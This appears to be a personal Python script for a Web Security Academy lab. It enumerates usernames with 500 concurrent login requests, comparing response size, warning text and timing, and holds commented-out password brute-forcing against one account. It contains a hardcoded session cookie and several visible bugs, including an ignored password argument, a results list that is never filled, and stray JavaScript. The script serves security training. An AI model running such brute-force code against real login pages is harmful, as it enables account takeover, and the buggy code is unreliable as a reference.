import requests
from sys import getsizeof
from lxml import html
import asyncio
from concurrent.futures import ThreadPoolExecutor
from timeit import default_timer

class Result:
    def __init__(self, status, size, warning, time, username):
        self.status = status
        self.size = size
        self.warning = warning
        self.time = time
        self.username = username

    def __repr__(self):
        return '{' + str(self.status) + ', ' + str(self.size) + ', ' + self.warning[0] + ', ' + str(self.time) + ', ' + self.username + '}'

username_file = open("./usernames.txt", "r")
usernames = []
for line in username_file:
    usernames.append(line.rstrip())
username_file.close()

password_file = open("./passwords.txt", "r")
passwords = []
for line in password_file:
    passwords.append(line.rstrip())
password_file.close()

cookies = {
    'session': 'TCAA5g8e1eg1do2nXTAnMtWhCxrYhGxf'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

results = []
session = requests.Session()

def login(session, username, password):
    with session.post(
        "https://aca51f9d1e47f0c88015aa5e00fc002b.web-security-academy.net/login",
        cookies=cookies,
        headers=headers,
        data= {
            'username': username,
            "password": "b"
    }) as r:
        tree = html.fromstring(r.content)
        warning = tree.xpath('//p[@class="is-warning"]/text()')

        return Result(r.status_code, getsizeof(r.content), warning, r.elapsed.total_seconds(), username)

async def login_async():
    with ThreadPoolExecutor(max_workers=500) as executor:
        with requests.Session() as session:
            loop = asyncio.get_event_loop()
            tasks = [
                loop.run_in_executor(
                    executor,
                    login,
                    *(session, username, "a") # Allows us to pass in multiple arguments to `fetch`
                )
                for username in usernames
            ]
            for response in await asyncio.gather(*tasks):
                print(response)

# for username in usernames:
#     r = session.post(
#         "https://ac031f521f0f678a80d79c1d001800ce.web-security-academy.net/login",
#         cookies=cookies,
#         headers=headers,
#         data= {
#             'username': username,
#             "password": "b"
#         }
#     )
#     tree = html.fromstring(r.content)
#     warning = tree.xpath('//p[@class="is-warning"]/text()')
#     results.append(Result(r.status_code, getsizeof(r.content), warning, r.elapsed.total_seconds(), username))
#     # result
#     Promise.resolve(results)
#     print("da" + str(i))
#     i = i + 1

loop = asyncio.get_event_loop()
future = asyncio.ensure_future(login_async())
loop.run_until_complete(future)

results.sort(key= lambda x: x.time)

for result in results:
    print(result)

# for password in passwords:
#     r = requests.post(
#         "https://acf91fbe1fcc267280b30af600b30048.web-security-academy.net/login",
#         cookies=cookies,
#         headers=headers,
#         data= {
#             'username': "amarillo",
#             "password": password
#         }
#     )
#     tree = html.fromstring(r.content)
#     warning = tree.xpath('//p[@class="is-warning"]/text()')
#     print(r.status_code, getsizeof(r.content), warning, password)
#     # if r.status_code != 504:
#     #     print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")

